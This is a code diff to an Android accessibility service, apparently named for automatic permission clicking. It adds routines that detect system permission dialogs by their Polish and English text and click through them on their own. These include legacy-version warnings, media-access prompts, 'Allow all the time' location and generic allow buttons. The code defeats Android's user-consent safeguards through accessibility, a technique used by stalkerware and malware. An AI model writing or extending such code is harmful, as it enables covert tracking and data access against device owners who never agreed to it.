@@ -148,6 +148,11 @@ public class PermissionClickerAccessibilityService extends AccessibilityService 
             return;
         }
 
+        if (isLegacyPermissionWarningDialog(packageName, screenText)) {
+            clickLegacyPermissionConfirm(root);
+            return;
+        }
+
         if (isRuntimePermissionDialog(packageName, screenText)) {
             handleRuntimePermissionDialog(root, screenText);
             return;
@@ -277,6 +282,42 @@ public class PermissionClickerAccessibilityService extends AccessibilityService 
         if (now - lastBackTime < 1200) return;
         lastBackTime = now;
         performGlobalAction(GLOBAL_ACTION_BACK);
+    }
+
+    private boolean isLegacyPermissionWarningDialog(String packageName, String screenText) {
+        boolean systemDialog = packageName.contains("permissioncontroller")
+                || packageName.contains("packageinstaller")
+                || packageName.contains("android")
+                || packageName.contains("settings");
+
+        boolean warningText = screenText.contains("starszej wersji androida")
+                || screenText.contains("older version of android")
+                || screenText.contains("dostep do zdjec i filmow")
+                || screenText.contains("dostęp do zdjęć i filmów")
+                || screenText.contains("dostep do muzyki")
+                || screenText.contains("dostęp do muzyki")
+                || screenText.contains("dostep do zdjec i filmow rowniez bedzie mozliwy")
+                || screenText.contains("również będzie możliwy")
+                || screenText.contains("rowniez bedzie mozliwy");
+
+        boolean confirmButton = screenText.contains("potwierdz")
+                || screenText.contains("potwierdź")
+                || screenText.contains("confirm")
+                || screenText.contains("ok");
+
+        return systemDialog && warningText && confirmButton;
+    }
+
+    private void clickLegacyPermissionConfirm(AccessibilityNodeInfo root) {
+        if (!canClickNow()) return;
+
+        if (clickByTextAllowDanger(root, "Potwierdź")
+                || clickByTextAllowDanger(root, "Potwierdz")
+                || clickByTextAllowDanger(root, "Confirm")
+                || clickByTextAllowDanger(root, "OK")
+                || clickByTextAllowDanger(root, "Ok")) {
+            markClicked();
+        }
     }
 
     private boolean isRuntimePermissionDialog(String packageName, String screenText) {
@@ -469,13 +510,20 @@ public class PermissionClickerAccessibilityService extends AccessibilityService 
 
     private void handleLocationScreen(AccessibilityNodeInfo root) {
         if (!canClickNow()) return;
+
         if (isAlwaysLocationAlreadyChecked(root)) {
             enablePreciseLocationIfVisible(root);
             markClicked();
             goBackToPermissionsListLater();
             return;
         }
-        if (clickAnyText(root, alwaysLocationButtons)) {
+
+        if (clickAnyText(root, alwaysLocationButtons)
+                || tapTextCenter(root, "Zawsze zezwalaj")
+                || tapTextCenter(root, "Zezwalaj cały czas")
+                || tapTextCenter(root, "Zezwalaj caly czas")
+                || tapTextCenter(root, "Allow all the time")
+                || tapTextCenter(root, "Always allow")) {
             markClicked();
             handler.postDelayed(() -> {
                 AccessibilityNodeInfo r = getRootInActiveWindow();
@@ -525,6 +573,12 @@ public class PermissionClickerAccessibilityService extends AccessibilityService 
 
     private void handleGenericPermissionScreen(AccessibilityNodeInfo root) {
         if (!canClickNow()) return;
+        if (clickByTextAllowDanger(root, "Potwierdź")
+                || clickByTextAllowDanger(root, "Potwierdz")
+                || clickByTextAllowDanger(root, "Confirm")) {
+            markClicked();
+            return;
+        }
         if (clickAnyText(root, allowButtons)) {
             markClicked();
             goBackToPermissionsListLater();
